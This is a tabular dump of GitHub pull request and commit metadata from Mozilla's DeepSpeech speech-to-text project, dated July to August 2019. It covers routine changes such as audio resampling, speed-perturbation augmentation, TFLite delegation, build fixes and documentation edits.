1965,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2283,2283,Checking for empty transcripts during character encoding,"This way we can get a plain English exception early, rather than a matrix shape error during training.",rcgale,2279700,2019-08-01T19:09:51Z,CONTRIBUTOR,True,24,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85e25fa2d7a3c3583790c94acaf4d5e600cbe064,Applying text_to_char_array to each row in DataFrame so we can provide wav_filename context on exception
1966,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2282,2282,Use dynamic batch size in train/val graph,Avoid needing to use the same batch size for training and validation.,reuben,477142,2019-08-01T12:54:42Z,MEMBER,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3636d9b4816084ad2d2a856f0d5a51a2b345c260,"Use dynamic batch size in train/val graph

Avoid needing to use the same batch size for training and validation."
1967,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2273,2273,Refactor Alphabet to fail if alphabet file doesn't exist,Opening this as a new PR because I accidentally screwed up #2193.,dabinat,18251622,2019-07-28T00:11:48Z,COLLABORATOR,False,28,5,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2a1982d95da99d63150e0eff46cd0dd820f6bcaa,Refactor Alphabet to fail if alphabet file doesn't exist
1968,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2268,2268,Fix #2180 - Added wav_filename to WER report,,tilmankamp,5991088,2019-07-23T13:07:00Z,CONTRIBUTOR,True,16,11,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,007e512c0059440411647d68757ad89f62b4aad2,Fix #2180 - Added wav_filename to WER report
1969,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2267,2267,"WIP: Enable TFLite delegations (NNAPI, GPU)",,lissyx,1645737,2019-07-23T12:23:39Z,COLLABORATOR,False,89,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d595998003feb9a6956512469d51c4466c6c0e0d,"WIP: Enable TFLite delegations (NNAPI, GPU)"
1970,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2267,2267,"WIP: Enable TFLite delegations (NNAPI, GPU)",,lissyx,1645737,2019-07-23T12:23:39Z,COLLABORATOR,False,89,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,345102da99962de1182687d90539fa62e66804a6,WIP: Delegates hacking
1971,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2266,2266,Resampling to 16khz,"Resampling audio files to 16khz if dataset has any other sampling rate. 



I tried exporting models trained on 44100 and 22050 khz and it throws the ambiguous shape error as observed in this thread.
https://discourse.mozilla.org/t/trained-model-on-my-own-data/41810/42
I understand that the python client only supports 16khz currently, so I thought we could just resample the dataset to 16khz if the files are not in 16khz and then train it.

The Time consumption overhead is minimal. I've tested the code on 44.1khz dataset. 

",alchemi5t,9457955,2019-07-23T09:04:37Z,CONTRIBUTOR,False,19,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe271db524468c0420cba0b735588e5688ac1b31,"Resampling to 16khz

add requirement for librosa

pylinting

tf.py_func to tf.compat.v1.py_func

updating description in flags for augmentation

Flags for data augmentation

adding descriptions to data augmentation flags

resampling input to 16Khz

removing remnant arguments

editting requirements

Removing remnants

adding newline to requirements

removing random

adding target sr as argument

fixing else path if sr==16000

pylint"
1972,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2265,2265,Allow loading a CuDNN RNN checkpoint in a CPU-capable graph (Fixes #2264),,reuben,477142,2019-07-22T10:58:59Z,MEMBER,True,41,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3d0a44e83fffa733756cdd087d4b94a026d5fb6,Allow loading a CuDNN RNN checkpoint in a CPU-capable graph
1973,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2263,2263,Remove use of StridedSlice and update op/kernel deps (Fixes #2179),,reuben,477142,2019-07-22T08:33:50Z,MEMBER,True,29,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23f5bc090d95046b220a35608c2d251cdf251989,Update prod model to version re-exported with latest master
1974,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2263,2263,Remove use of StridedSlice and update op/kernel deps (Fixes #2179),,reuben,477142,2019-07-22T08:33:50Z,MEMBER,True,29,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6afd96e30f3ce1f0d32132643032c17deff2b8f2,Use static batch size whenever it's known
1975,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2263,2263,Remove use of StridedSlice and update op/kernel deps (Fixes #2179),,reuben,477142,2019-07-22T08:33:50Z,MEMBER,True,29,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fb3b8f22dee0a8e94471cf74c622dd52f50cead,Update kernel/op dependencies
1976,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2263,2263,Remove use of StridedSlice and update op/kernel deps (Fixes #2179),,reuben,477142,2019-07-22T08:33:50Z,MEMBER,True,29,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c29cda641e6a23ca815bedf0d24c24c9ab9e9e1,Remove trailing whitespace
1977,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2260,2260,Update Dockerfile,,harshhegde,34958345,2019-07-20T16:02:33Z,NONE,False,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93b500f9c4afc3c1bd940c403b2c5cc570a0c251,Update Dockerfile
1978,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2258,2258,Add liblzma-dev to build python from pyenv with _lzma,Fixes #2256,lissyx,1645737,2019-07-19T14:46:01Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,938fdaf118aedc8d85d60c3235c2a4edae187f83,"Add liblzma-dev to build python from pyenv with _lzma

Fixes #2256"
1979,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2baa074159ec02b473f2bc3448f90d4e4fce8e4c,"Data augmentation(pitch and speed)

add requirement for librosa"
1980,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d5ed6e5788d0ede4d155d9cfd63e8a0a806216d,pylinting
1981,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e9d1fdb4017d4a4e0b15963b74a160c38dc30b2,tf.py_func to tf.compat.v1.py_func
1982,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,914f76d517cd41c0b7fa0954d29cc61708e525f2,updating description in flags for augmentation
1983,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,613d31b39a621e90755612f501729dbd804b414e,Flags for data augmentation
1984,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2255,2255,Data augmentation(pitch and speed),Pitch modulation and speed variation.,alchemi5t,9457955,2019-07-19T14:02:54Z,CONTRIBUTOR,False,40,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11404d08ee5b2771e431f3bd08f042141271c28a,adding descriptions to data augmentation flags
1985,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2254,2254,Fix typo in Android doc,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-07-19T13:24:39Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fc3c48462c4e1463f0ce31bd0eaac2bf35627f3,"Fix typo in Android doc

X-DeepSpeech: NOBUILD"
1986,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2253,2253,Remove useless make target 'bindings-clean',Fixes #2175,lissyx,1645737,2019-07-19T13:23:06Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eca7882b146f0c0d1b46d13205b0d2028482ec71,"Remove useless make target 'bindings-clean'

Fixes #2175"
1987,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94a6e433ae4e648494c6caaa004a454fa6a62334,Added Speed Pertubation
1988,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,087a1daa4eef1e335f26d2f410a4249dea3ef3cc,Speed Augmentation using librosa
1989,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94c176144284bf29c21388f9ae3a6d5cf086fdb8,Speed Augmentation using librosa
1990,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3abecf5a768ac7d60875007f3da606afac8cfff,removed pyrubberband from the requirements.txt
1991,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49fd1f8a0f6839713e787012a52a5c1a94bc006b,Removed global flags
1992,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c25956511dadab06f3c4644cb80b63bf044d26ae,Fixed linter errors
1993,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d70037707b3a7d023c5a5e2fb19c0370de376ad0,Fixed linter errors
1994,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d87c3314a802e2c3498823394737ae9764a6fe53,fixed linter error 47:12     util/feeding.py  too-many-function-args Too many positional arguments for function call
1995,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c298ad0ca930137dfac11950138f760ee1339666,Added eof
1996,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9867bc995099e5386f0fa34660ace6817341e034,Augmentation Framework
1997,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,823b3245ae22ba2c1f75a8c8697627486522a5b2,Augmentation framework with specaugment and audio augment
1998,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e423c4f505422420bbd2168f884633c01b8a77c,Removed git merge issues
1999,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fbbbe2acd2732e1ace10ae897a91374114f2c44,tf.py_func to tf.compat.v1.py_func
2000,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1c17a56a2428102245e443d0cec765493872003,requirements.txt eof added back
2001,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b7f45961b813c163372fb6001dec76f73b2b343,merged with master
2002,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d642bc2f7a04a3a5a9faee9e36c28dddce25359,Updated the README
2003,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a25264d86d501a90d48840cd21e3f4108187fe6c,Changed as per the PR review
2004,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2da040e4d9097ee69276964bf826ad4b5a69c1da,refactored augmentation module to reduce the redundant code in the pipeline
2005,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a4dd88a39d5dce8120399997eda274c4b30af08,removed pertubation.py
2006,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,919d02a44b1ce6ee80ba3fc7606ca01ff6efc4cd,resolved linting issues
2007,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0c4623473f1bd9a553720ae242171a9c6fdcf85,resolved linting issues
2008,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,deb71693ea5d8e6eeeac36d750d15e8d13ac3dc3,resolved linting issues
2009,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c57618d856cdcb4c0813ceef429441fe4124f3e9,resolved linting issues
2010,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ab487b43cdbc10d110a4e2d446b06099825ce36,resolved linting issues
2011,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2252,2252,Online Pertubation,"Currently, Speed Perturbation has been implemented. As a lot of text is read in a very formal fashion, if someone speaks fast is not captured accurately. Thus, the speed_pertubation creates new samples with different rate of perturbations for new epochs.",cahuja1992,5588828,2019-07-19T06:54:12Z,CONTRIBUTOR,False,325,26,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b5fcc19fa4b8355def5237a4ef1561c2333b83a,Merge branch 'pertub' of https://github.com/cahuja1992/DeepSpeech into pertub
2012,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2250,2250,Added reference about generate_trie for clarity,Fixed the commits. sorry for the trouble.,alchemi5t,9457955,2019-07-18T11:33:58Z,CONTRIBUTOR,True,3,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5c3e8f5e79ab93257ba9dd04afa05b411c044fbc,Added reference about generate_trie for clarity
2013,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2249,2249,Editting doc for clarity.,"https://discourse.mozilla.org/t/tutorial-how-i-trained-a-specific-french-model-to-control-my-robot/22830/8

There are quite a few people who couldn't figure out where to find generate_trie. just adding a small reference to hopefully give clarity.",alchemi5t,9457955,2019-07-18T05:20:17Z,CONTRIBUTOR,False,144,51,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfbad266959bbfe77c737efb2962cb7f52ddc3ae,Package Windows link-lib
2014,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2249,2249,Editting doc for clarity.,"https://discourse.mozilla.org/t/tutorial-how-i-trained-a-specific-french-model-to-control-my-robot/22830/8

There are quite a few people who couldn't figure out where to find generate_trie. just adding a small reference to hopefully give clarity.",alchemi5t,9457955,2019-07-18T05:20:17Z,CONTRIBUTOR,False,144,51,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97bb5418aa0d5b1c7cf7507e04f8e075b7bd8a2d,"Revert ""Remove deprecated SessionConfig in favor of just using defaults"" as it inadvertently disables soft placement of ops

This reverts commit dc78f8d1e65c4b387aa335df243898cd04704f98."
2015,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2249,2249,Editting doc for clarity.,"https://discourse.mozilla.org/t/tutorial-how-i-trained-a-specific-french-model-to-control-my-robot/22830/8

There are quite a few people who couldn't figure out where to find generate_trie. just adding a small reference to hopefully give clarity.",alchemi5t,9457955,2019-07-18T05:20:17Z,CONTRIBUTOR,False,144,51,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa7b62cefe3c040e09bb97dac2310dfe92c3ad7c,Leverage TaskCluster-level caching for Homebrew and Python on macOS
2016,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2249,2249,Editting doc for clarity.,"https://discourse.mozilla.org/t/tutorial-how-i-trained-a-specific-french-model-to-control-my-robot/22830/8

There are quite a few people who couldn't figure out where to find generate_trie. just adding a small reference to hopefully give clarity.",alchemi5t,9457955,2019-07-18T05:20:17Z,CONTRIBUTOR,False,144,51,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e18e48a989fe36a3f8a93e96dda8c961a3fb673,Exclude generated SWIG wrapper code from decoder sources
2017,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2249,2249,Editting doc for clarity.,"https://discourse.mozilla.org/t/tutorial-how-i-trained-a-specific-french-model-to-control-my-robot/22830/8

There are quite a few people who couldn't figure out where to find generate_trie. just adding a small reference to hopefully give clarity.",alchemi5t,9457955,2019-07-18T05:20:17Z,CONTRIBUTOR,False,144,51,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fcb32222a41805bc1bf34ab8c9204c6f2aeb67a,"update README.md

Adding references to generate_trie for clarity"
2018,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2247,2247,Exclude generated SWIG wrapper code from decoder sources,,reuben,477142,2019-07-17T13:16:45Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8af1286d87de6398339e2b03e03bf0e74d7dadea,Exclude generated SWIG wrapper code from decoder sources
2019,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2245,2245,"Revert ""Remove deprecated SessionConfig"" as it inadvertently disables soft placement of ops",This reverts commit dc78f8d1e65c4b387aa335df243898cd04704f98.,reuben,477142,2019-07-15T13:07:56Z,MEMBER,True,13,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6566299adf38940b9fbff6c540aa9e06f69c5fd2,"Revert ""Remove deprecated SessionConfig in favor of just using defaults"" as it inadvertently disables soft placement of ops

This reverts commit dc78f8d1e65c4b387aa335df243898cd04704f98."
2020,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2244,2244,Ensure --cuda flag passed for CUDA builds,Fixes #2243,lissyx,1645737,2019-07-12T12:16:32Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9d9b33ff66bc75430f957cebe39968d790f5652,"Ensure --cuda flag passed for CUDA builds

Fixes #2243"
